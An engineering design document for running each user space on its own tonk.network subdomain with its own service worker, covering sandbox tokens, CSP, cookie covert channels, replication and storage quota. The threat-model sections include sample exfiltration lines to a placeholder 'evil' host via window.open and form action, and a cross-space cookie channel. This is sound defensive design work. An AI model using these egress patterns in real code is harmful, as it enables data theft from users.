# Space Workers

## Problems

### Load balancing

At the moment whole system shares single service worker that attempts to load balance between needs of several user spaces along with chrome. Despite our best efforts it is still hard to prioritize work and even if our heuristics end up being very good there is still limit to how much work single thread can do.

### Serving resources

Spaces being null origin prevents them from being controlled by a service worke which in turn implies that reading resources like images, stylesheets, fonts, videos all need to happen through a custom message passing channel and requires custom elements or other workarounds, forcing us to rebuild capabilities parallel to the one web already offers. E.g streaming video a real challenge because you can't simple use video tag instead you need to build out a whole pipeline over message ports.

### Same Version

In current architecture all spaces share same SW and therefor same version of dialog and service worker code also. It becomes impossible to upgrade one space and not the other, worse upgrade takes place whether you're ready or not.

## Goal

We could overcome above problems if we give each space own service worker on a custom origin. This way we stop fighting web platform and instead leverage it gaining ability to server resources from the DB directly so video, img, link, script and everything eles could just reference stored blobs.

At the same time we let the browser do the load balancing, sync spaces when their SW is active and stop sync when they are not. If browser decides clear cache on specific space other spaces survive eviction.

## Naming

Host is `tonk.network`. Each space is `{pub_key}.tonk.network`.

## Alternatives considered

### Path-scoped service workers on a single origin

A service worker scoped to `/space/{did}/` on one origin would give us separate registrations per space, independent lifecycle, independent versions, browser-managed scheduling, and real `fetch` interception. That covers load balancing, resource serving, and versioning without wildcard DNS and without the local dev problem.

What it does not give us is **storage isolation** and **security isolation between spaces**. All spaces would share one origin's IndexedDB, one quota, and one eviction decision, and space code could read every other space's data.

Rejected. The whole cost of wildcard DNS and hostile local dev is being paid for isolation, not for the service worker or resource-serving wins. Those we could have had cheaply.

### CSP embedded enforcement (`csp` attribute on iframe)

Would let the host impose a policy on the guest document. Effectively dead: Chrome removed enforcement, Firefox and Safari never implemented it, and even where it existed the embedded document had to opt in via `Allow-CSP-From` or the load was blocked. Cannot be used to constrain a guest that does not cooperate, which is the only interesting case. Do not build on it.

### Preview envs as nested subdomains

`{pub_key}.pr-123.tonk.network` needs a second wildcard depth, which wildcard certs do not cover. Rejected in favour of flat labels (see Preview environments).

## Security model

Four enforcement mechanisms, four different enforcers, none of which depend on space code behaving.

| Boundary | Enforced by | Protects against |
| --- | --- | --- |
| Origin | Browser | Space reading another space's storage, or the host's |
| iframe `sandbox` | Host document | Top-level navigation, popups, and other exfiltration-by-navigation |
| CSP | Space service worker (ours) | Network access from space code |
| Site separation (PSL) | Browser | Cookie-based covert channel between spaces |

### Threat model

Spaces load and execute **author-supplied code**. That code is not trusted. It may be hostile, and two spaces may be cooperating to exchange data outside the bridge.

The service worker is **not** author code and **is** trusted. See The trusted service worker invariant.

### Sandbox with `allow-same-origin`

Spaces are framed with `sandbox="allow-scripts allow-same-origin"`.

The usual footgun with that pair is that a same-origin guest can reach into its framer and delete its own `sandbox` attribute. That does not apply here: `{pub_key}.tonk.network` is a different origin from `tonk.network`, so the guest cannot touch the parent document and cannot un-sandbox itself.

What `allow-same-origin` buys is exactly what this redesign is for: a real origin, therefore storage, a service worker, and real `fetch` semantics.

Consequence: **the sandbox is no longer the isolation boundary.** Today it is the whole boundary. After this change the origin is the boundary, and the sandbox is defense-in-depth for a specific list of capabilities. Stop describing spaces as "sandboxed"; describe them as separate origins, additionally sandboxed against navigation and popups.

Tokens deliberately withheld, each for a reason:

- `allow-top-navigation` and `allow-top-navigation-by-user-activation` — a space must not navigate the top frame. This is exfiltration-by-navigation, which CSP `connect-src` does **not** cover.
- `allow-popups` — same reason. `window.open('https://evil/?' + data)` is a network egress path.
- `allow-modals`, `allow-pointer-lock`, `allow-downloads` — UI capture and unwanted egress.
- `allow-forms` — see `form-action` below. We have been bitten by this before.

### The trusted service worker invariant

> The service worker script for a space origin is always Tonk-authored code served by the Tonk server. Space-authored code runs as page content under that service worker, never as the service worker.

This is what makes CSP enforceable. A service worker can return a fully synthetic `Response` with whatever headers it likes, and the browser applies CSP from the response it committed — not from whatever the server sent on some earlier navigation. So a hostile service worker could simply serve itself no CSP at all. The policy is only worth anything if the service worker is ours.

What keeps it ours:

1. **The service worker script fetch bypasses the active service worker.** A service worker never intercepts requests for service worker scripts. `register()` always goes to the network, so a compromised service worker cannot serve its own replacement. *(Verify in the spike — see Open questions.)*
2. **The server never serves author bytes.** Every server response from a space origin is Tonk-authored HTML (see Catch-all bootstrap). `register('/blob/evil.js')` fetches from the network, gets `text/html`, fails the MIME check.
3. **`X-Content-Type-Options: nosniff`** on the catch-all, so nothing can coax sniffing into treating it as script.
4. **`worker-src 'none'`** in the service-worker-served CSP, so `register()` from a space document fails closed regardless of what the network does. Registration is governed by the *registering document's* `worker-src`.

Rules 2 and 3 make the attack fail on content type. Rule 4 makes it fail on policy. Keep both: rule 4 is the one that survives a future change to what the server serves.

**Unregistering** is freely available to space code (`getRegistrations()` then `unregister()`, same-origin, no prompt) and is self-harm with automatic recovery. With the service worker gone the space stops working — no blobs, no assets. The next navigation hits the server, gets the bootstrap with our CSP, and reinstalls. Not an attack.

### Catch-all bootstrap

The server serves the same static Tonk-authored HTML page from any URI on a space origin.

This is the self-healing mechanism: with the service worker gone, a deep link like `/blob/{hash}` must return something that boots and re-registers it, rather than a dead 404.

It means `/blob/{hash}` returns 200 `text/html` rather than 404, so the "no author bytes over the network" property rests on content type rather than on the path being empty. That is fine, given `nosniff` and `worker-src 'none'`, but it must be stated as a deliberate choice rather than left as an accident.

The bootstrap HTML must be **path-independent**, since it is served at arbitrary paths and relative asset references would resolve differently at `/blob/x` than at `/`.

### CSP

Delivered as a header on the space's own responses. Two sources, both ours:

- **First load**, no service worker yet: headers come from the real server on the catch-all response. This is the one guaranteed-trustworthy response and it is where registration happens. Getting the policy right here matters more than anywhere else.
- **Every load after**: the service worker constructs the response and sets the headers.

Policy sketch:

- `default-src 'none'` — explicit allowances only. Safer than `'self'`, which has historically leaked through prefetch-adjacent directives.
- `connect-src 'none'` — no fetch, XHR, WebSocket, EventSource, or beacon. See Network access.
- `img-src 'self'`, `media-src 'self'`, `font-src 'self'`, `style-src 'self'`, `script-src 'self'` — everything resolves through the service worker into the space DB. This tight a policy actually working is a nice property of the architecture.
- `worker-src 'none'` — blocks `register()`.
- `frame-ancestors https://tonk.network` — a space may only be framed by the host.
- `form-action 'none'` — closes form-navigation egress.
- `base-uri 'self'` — check against `<base href>` usage (see Open questions).
- No `report-uri` / `report-to` to an external endpoint: a space can trigger violations in a pattern that encodes data.

Host side: `frame-ancestors` on the host, plus COOP and COEP. `Cross-Origin-Resource-Policy: same-origin` on space resources.

**What survives a fully compromised space service worker**, should the invariant ever break: the iframe `sandbox` attribute (host-controlled, unstrippable cross-origin), `frame-ancestors` on the host, the host's COOP/COEP, and the origin itself. Everything in the space's own response headers does not.

### Network access

**Space code gets no network.** `connect-src 'none'` plus `'self'`-only resource directives means no outbound path from author code at all. Everything it can name resolves through the service worker into the space DB.

Leaks that survive `connect-src 'none'`, closed by the sandbox token list above rather than by CSP:

- Navigation is **not** covered by `connect-src`. `window.open`, `top.location`, `<a target=_blank>`, `<form action="https://evil/">`. This is the first thing to check.
- Prefetch and `<link rel=dns-prefetch>` — covered by `default-src 'none'`.

**Sync is the exception and must be stated precisely.** The space has no network; the space's *data* still replicates. Replication runs in the trusted service worker under Tonk's rules, not in space code. See Replication I/O.

**Product consequence:** no third-party embeds. No YouTube iframes, no external images, no CDN fonts, no analytics. Everything a space renders must be in its DB. This is a stated decision, not a discovered limitation.

### Cookies and the covert channel

`a.tonk.network` and `b.tonk.network` are cross-origin but **same-site**. Storage, IndexedDB, Cache Storage, service worker registrations, and `postMessage` targeting are all origin-scoped and therefore already isolated. Cookies are not.

The attack: two cooperating spaces both write `Domain=tonk.network` cookies and both read them, giving a bidirectional covert channel that bypasses the bridge entirely. Since spaces run author code, both ends may be hostile.

**CSP cannot close this.** There is no cookie directive; a proposal existed years ago and was dropped. CSP governs which resources a document may load and execute and has no hooks into `Set-Cookie` or `document.cookie`. "Lock down CSP aggressively" reads as covering this and does not.

What actually closes it:

- **PSL listing — the real fix, and a requirement.** Get `tonk.network` onto the Public Suffix List as a private entry. Every `{pub_key}.tonk.network` then becomes a different *site*, not merely a different origin. `Domain=tonk.network` from a space is rejected by the browser at the cookie store, and neither space can opt back in. Free, a PR to the PSL repo, a few weeks to propagate through browser releases. Cost: we can never set a `Domain=tonk.network` cookie ourselves, and delisting is slow. If the host needs no cross-subdomain cookies this costs nothing. If we want to keep the apex free, put spaces under `*.spaces.tonk.network` and list `spaces.tonk.network`.
- **`__Host-` prefix** on anything the host sets. Browser-enforced: rejected unless `Secure`, `Path=/`, and **no** `Domain` attribute. A subdomain therefore cannot forge or overwrite it.
- **Not using cookies**, which is the strongest version and where we believe we already are. Confirm.

Deleting `document.cookie` from the guest's JS environment at bootstrap is defeatable — a fresh same-origin iframe or worker gets a clean realm — so it is a speed bump, not a boundary. `Clear-Site-Data: "cookies"` is served by the space's own service worker and hostile code just stops sending it.

Channels that remain after PSL: timing and resource contention (unfixable, accept), `window.name` across navigations in the same tab, and **the host bridge itself**. Once network is closed the bridge is the only door and every capability on it is the real attack surface. That is a better place for the remaining design work to live, since it is our code and we can enumerate it.

### Approved embeds

A visitor may let a space embed a third-party origin (YouTube, Google Maps) by explicitly approving it.

A service worker cannot hold such a request pending: an `<iframe src="https://youtube.com/…">` navigation goes to the service worker of the *target's* scope, never the space's, and CSP blocks it before any worker sees it. What works is that the space worker writes the CSP on every document it serves, so a grant widens the policy it writes.

1. The embed is blocked, and a `securitypolicyviolation` event fires in the space document.
2. The space asks the host for the origin (`request-embed`). The profile chrome renders the prompt.
3. A grant is a fact in the **visitor's profile**, keyed by (space, origin). It never lives in the space, so an author cannot grant themselves.
4. The host tells the space worker over the port it already holds. The worker adds the origin to `frame-src` (or `img-src`, `media-src`) and the frame reloads.

The prompt must say what it grants. Once `youtube.com` is allowed, space code can encode data into an embed URL, so the honest wording is "this space may send data to youtube.com", not only "show a video". Space code can also raise violations on purpose, so prompts are rate-limited and a dismissal sticks per origin.

## Replication I/O

**Correction to the "no network" claim.** Space databases replicate over our hosts. So either the space origin gets network access, or we establish a channel from the guest service worker to the host service worker which performs the I/O on its behalf.

The latter is preferred: it keeps `connect-src 'none'` intact and keeps all egress under host-controlled code. The guest service worker obtains a `MessagePort` on load and does its replication I/O through it.

**The lifecycle wrinkle.** Service workers are killed and restarted at any time, and a `MessagePort` held by a dead service worker is gone. The host service worker cannot proactively reach a guest service worker, so the port cannot be re-delivered directly.

**Recovery is guest-initiated through a client.** On restart the guest service worker calls `clients.matchAll()`, postMessages one of its own clients, and asks it to broker a fresh port from the host. The client relays to the host, the host hands back a port. The guest drives its own recovery; the client is only a relay, and does not need to detect the restart.

Use `matchAll()` rather than `clients.get(id)` — iOS has returned undefined from `clients.get()` before.

Consequences to design for:

- **A space with no open client cannot sync**, since the guest service worker has nobody to ask. Any open client is sufficient. Whether that matters depends on whether we expect background sync for closed spaces.
- A heal probe and keepalive, as in the existing service worker restart work.

This is the same shape as problems we have already solved once. Reuse the approach rather than rediscovering it.

Also note: no stream transfers into sealed frames on Safari, which forced a credit-based `MessagePort` fallback previously. Same constraint applies to this channel.

## Challenges

### Offline Limitations

One service worker means even offline you can create new space, however with SW per space creating a new space offline becomes impossible because first load of that space requires a service worker.

**Decision: pre-warmed pool, loaded in hidden iframes.**

A pooled space is a pre-assigned keypair whose public key is its origin, warmed by loading it in a hidden iframe so its service worker installs while online. Creating a space offline takes one from the pool.

To settle:

- **Warming cost.** N iframe loads, each a bootstrap fetch plus service worker install plus wasm compile. We already track cold-load perf and have already found boot serialized behind slow work. Warm lazily after first paint, one at a time on idle callbacks, and persist the knowledge that an origin is warm so it is not redone every session.
- **Shared HTTP cache.** Cache is partitioned by top-level site. Pooled iframes share the `tonk.network` top-level site, so the wasm bundle *should* be shared rather than fetched N times. **But PSL listing splits spaces into separate sites, which may lose that sharing and make each pooled origin pull the full runtime.** This is a direct tension between two things this document recommends. Measure before committing.
- Pool size, where unused keypairs live, and whether a pooled-then-used space is distinguishable from a normally-created one.
- UX when the pool is empty and the user is offline.

The hybrid alternative — a shared offline worker, migrated to its own origin once online — was set aside because migration is painful. Note however that **migration is required anyway** for rotation and forking, so the subsystem exists either way and the hybrid is cheaper than it first appears. Revisit if pool warming proves too expensive.

### Migration between origins

Required for rotation and forking: a space's origin derives from its public key, so a new key means a new origin and all its data is stranded at the old one.

There is no browser primitive for moving IndexedDB across an origin boundary. It is an explicit protocol over `postMessage` between two iframes with the host mediating, which means:

- O(space size), needing chunking, backpressure, and resumability.
- No transferable streams on older Safari, so the credit-based `MessagePort` fallback applies here too.
- **Partial migration is the dangerous state.** Two-phase commit: copy everything, verify, mark the new origin authoritative, only then delete the old. Plus a recovery path for a crash at any point.

Open: how often rotation and forking actually happen. Rare and user-initiated tolerates a visible progress UI; routine makes this a hot path needing a much better design.

### Lifecycle issues multiplied

Service worker lifecycle is already a very complex to manage, with worker per space we multiply it.

Note the tension with the Same Version goal: per-space version independence is a *feature*, which means deliberately letting spaces run old service workers. But a stale service worker runs stale security policy, so **update cadence is now a security control**, not just a versioning nicety. Decide how far version drift is allowed before an update is forced.

### Origin per space

Requires a wildcard DNS record and a wildcard certificate in production.

### Preview environments

Wildcard certs cover exactly one label depth. `*.tonk.network` works; `{pub_key}.pr-123.tonk.network` does not.

**Decision: flat labels.** `{pub_key}--pr-123.tonk.network` is a single label and is covered by the existing wildcard. Nothing structural changes, no cert work, no DNS work.

Check that `{pub_key}` plus separator plus env tag stays under the 63-character DNS label limit, and the whole name under 253.

Alternatives if flat labels do not work out: a separate apex per preview tier (`*.pr-123.tonk.dev`); Let's Encrypt wildcards via DNS-01 (free to issue — the cost question is whether uploading custom certs to Cloudflare needs a paid plan, not the issuance). Explicitly rejected: running previews in single-service-worker path-scoped mode, since we would be testing a different architecture than we ship.

### Local development

**Decision: real dev domain on loopback.** A wildcard DNS record `*.dev.tonk.network` resolving to `127.0.0.1`, with a wildcard certificate we ship or fetch. Works in every browser, costs one DNS record and a cert.

Safari specifically does not do localhost suborigins, but no one develops in Safari, so that is not the motivation — the motivation is that this is simply the standard answer and it is cheap.

Rejected: `dnsmasq` / `.local` tricks (fail on Safari and CI); a dev-only fallback to path-scoped single-service-worker mode (two architectures, and the one we test is not the one we ship).

In scope for this work: cert trust in headless Chrome for the e2e stack, the two-service `dev:web` setup, and Trunk's dev server host handling. All currently assume one origin.

The WebAuthn virtual authenticator just needs to bind to the dev host rather than `localhost`, since passkeys stay in the top page. Config, not redesign.

## Storage quota

Quota isolation cuts both ways and the doc should not claim only the upside.

- **Chrome.** Quota is per storage key (origin-scoped), derived from available disk — roughly 60% of disk as a global pool, with an individual origin able to use much of it. Ten space origins each see a large ceiling; the real limit is aggregate disk. Net: more headroom than today. Eviction is per-origin, so "other spaces survive eviction" holds.
- **Firefox.** Global pool based on disk, with a per-*group* (site) limit of 20%. All `*.tonk.network` origins share that group limit because they are the same site — no worse than today in aggregate, but no better, and one space blowing the group budget can take out its neighbours. **PSL listing fixes this**: separate sites means separate groups and separate eviction.
- **Safari.** Per-origin accounting, but a fresh origin starts with a small allowance and there are site-level and app-level ceilings, so N spaces do **not** get N× a single origin's budget. Plus 7-day eviction for non-installed sites applies per-origin: a space not visited in a week can be wiped while its siblings survive. Visiting the host does not protect a space origin.

So independent eviction means independent *survival* and independent *loss*. A rarely-opened space is on its own clock, where today touching any space keeps all of them alive. Whether that is a feature depends on whether users expect spaces to be durable.

Follow-ons:

- PSL listing is more valuable, not less. Another reason to treat it as a requirement.
- **`navigator.storage.persist()` per space origin** exempts an origin from automatic eviction in Chrome and Firefox. It must be requested per origin. Chrome grants silently on engagement heuristics; Firefox prompts; Safari does not really honour it. There is a real "ten permission dialogs" failure mode. Decide whether spaces request persistence on first load and what that UX is.

Numbers above should be **measured, not trusted** — browser quota behaviour changes and docs lag. `navigator.storage.estimate()` from inside several space origins, on each engine, with a deliberately large space.

## What regresses

- **Cross-space reads.** Believed to be nothing today, with profile as the likely exception — profile main is an upstream for the account and has real machinery. If profile is itself a space with its own origin, that relationship crosses an origin boundary and needs an explicit protocol. **Verify rather than assume.**
- **Shared runtime cache**, if PSL listing splits spaces into separate sites. See the pool warming note.
- **Coordination primitives.** `BroadcastChannel`, `navigator.locks`, `SharedWorker` are all origin-scoped and silently become per-space.
- **DID visibility.** The public key is now in DNS queries and TLS SNI rather than in a TLS-encrypted path. Decide whether that is acceptable.
- **Fake-origin navigation.** The `<base href>` mechanism exists because guests believe they are on a fake origin. With a real origin it may simply go away, which would be a simplification worth claiming as a win. Confirm, and check the interaction with `base-uri 'self'`.

## WebAuthn

**Not affected.** Passkeys run in the top page at `tonk.network`, never in a space iframe, so the RP ID is `tonk.network` and spaces never assert a credential. Registration and the PRF-derived account custody envelope stay exactly where they are.

PSL listing does not change this. RP ID matching is a registrable-domain-suffix rule, and a credential registered at `tonk.network` and used from `tonk.network` is an exact match with no suffix relationship in play. What the PSL entry does remove is the *option* of a space origin ever asserting the parent RP ID — which is a capability we do not want.

Keep it that way. A space needing its own credential would mean a different RP ID, different PRF outputs, and a different key derivation.

## Open questions

- Does a service worker script fetch genuinely bypass the active service worker in all three engines? The trusted-service-worker invariant rests on it. If any engine lets the active service worker serve the next one, a single compromise becomes permanent and self-perpetuating.
- Does PSL listing break the shared HTTP cache for pooled origins, and how much does that cost?
- Is background sync for spaces with no open client a requirement? A guest service worker with zero clients has nobody to broker a port through.
- Do we already use cookies anywhere on the host?
- How often do rotation and forking happen?
- Does `<base href>` fake-origin navigation survive, or go away?
- How far may a space's service worker version drift before an update is forced?

## Proof of concept

Built on `feat/worker-per-space`. Every `<tonk-site>` renders on a real origin: the profile chrome at `profile.{host}`, and each space at `{label}.{host}`, each with its own service worker. `/space/{did}` works unchanged. In development the host is `localhost:{port}`: `*.localhost` resolves to loopback, counts as a secure context, and each subdomain is its own site, so it behaves like the PSL-listed production case.

How it hangs together:

- **The chrome has to be on a real origin too.** It is what nests the space frame, and a frame nested in an opaque (null-origin) frame inherits its sandbox and is opaque as well. The top document mounts the profile site with `origin`; a `<tonk-site>` inside a real-origin guest takes a real origin of its own. `<tonk-portal>` and the FAB's portal stay sealed `srcdoc` frames.
- **Origins derive from the host's real origin**, which every guest is handed in its context, never from the current document. A site whose origin would equal its parent's falls back to `srcdoc`, since `allow-same-origin` on a same-origin child could lift its sandbox.
- A site frame loads `/space-origin.html`, which registers `/space_worker.js`, waits for control, then asks its parent for its document. The parent sends the same markup a sealed frame gets as `srcdoc`, and the shell `document.write`s it. The bridge handshake and runtime injection then run unchanged.
- The space database still lives on the host origin. The space worker serves `/blob/{hash}` by asking the host worker over a `MessagePort`. **Only the top document can reach the host worker, so it mints every port.** A nested frame's request goes up through the chrome, and the top document grants it only if the chrome portal's `allow` reaches the requested space. Queries and transactions still go through the existing bridge.
- The site worker passes the app's own `/images/` and `/fonts/` through to the server. A sealed frame used to reach them on the host origin; relative URLs now land on the site's origin.

Verified in Chrome, on `/space/{did}` and from the hub:

- Both workers register inside cross-site `sandbox="allow-scripts allow-same-origin"` frames, including the space frame nested in the chrome frame.
- `<img src="/blob/{hash}">` loads natively. A `Range` request gets a correct `206`.
- **The service worker script fetch bypasses the active worker.** `register('/blob/{hash}')` got the server's catch-all `text/html`, not the blob the space worker would have served, and was refused on MIME.
- On a worker-served load, the CSP blocks external `img-src` and `connect-src`, and `worker-src` refuses `register()` before any fetch.
- A stopped space worker recovers its port through its page and the relay in well under 100ms. A stopped host worker costs one ack timeout (3s) on the next read, then recovers.

Corrections to the design above:

- **`worker-src blob:` rather than `'none'`.** It still refuses `register()`, since a service worker script must be same-origin, but it leaves blob workers available to author code.
- **`'unsafe-eval'` is required.** Author views and element shims are compiled from strings (`new Function`). This costs nothing under the threat model: space code is untrusted by design, and the boundary is the origin and its lack of network, not `script-src`.
- **`frame-ancestors` must list the chrome's origin as well as the host**, and the chrome's `frame-src` must allow site origins. Every ancestor is checked, not only the parent.
- **The first load has no CSP.** The shell comes from the server before any worker exists. The server has to send a policy on the shell, but that policy must allow `worker-src 'self'`, or the shell could not register its worker. `register()` of author bytes on that first load is still refused on MIME.
- **Web Awesome fetches its icons from `ka-f.fontawesome.com`.** `connect-src` now blocks that, so those icons are missing. Sealed frames only got them because they had no CSP at all. The icon set has to be served from our own origin.
- **The space suffix cannot always be derived from the host name** once spaces live on a different registrable domain from the host (see Staging), so the suffix has to become configuration.

Not done yet: Firefox and Safari; the database in the space origin; data operations over the port; loading the runtime from the site origin instead of injecting it; self-hosted icons; `allow-downloads` and `allow-forms` review; a server-sent first-load policy; the suffix as configuration.

## Staging

Checked on 2026-09-23:

- `tonk.network` is production and live; its service DID is `did:key:z6MkthzL…LPup`. (An earlier check here said otherwise. That check was wrong: this machine's `/etc/hosts` maps `tonk.network` to `127.0.0.1`.)
- `tonk.spot` and `*.tonk.spot` are routed to the same production worker (`tonk-access-service`), with the same service DID. Any label gets a valid certificate and the app shell.
- `tonk.host` is an active zone with nothing on it.

Decision: `tonk.spot` and `*.tonk.spot` move to the staging worker (`tonk-access-service-staging`). `staging.tonk.spot` needs nothing of its own, since `*.tonk.spot` covers it.

## Spike

Prove end to end on one space, before anything else is built:

1. **Service worker registration inside a sandboxed same-origin cross-origin iframe, on iOS Safari.** The whole design collapses without it and Safari's service-worker-in-iframe behaviour has historically been the weakest. Do this first.
2. Wildcard cert plus loopback wildcard DNS for local dev, working in Chrome and Firefox including the headless e2e setup.
3. Blob serving from the space DB through the service worker: `<img>`, `<video>` with range requests, `<link>`, fonts.
4. Guest service worker to host service worker `MessagePort` handshake, including re-establishment after a forced service worker restart.
5. `navigator.storage.estimate()` across several space origins on each engine.
6. Confirm the service-worker-script-fetch-bypasses-active-service-worker behaviour.

Then a decision point before committing to migration, pooling, and the PSL request.
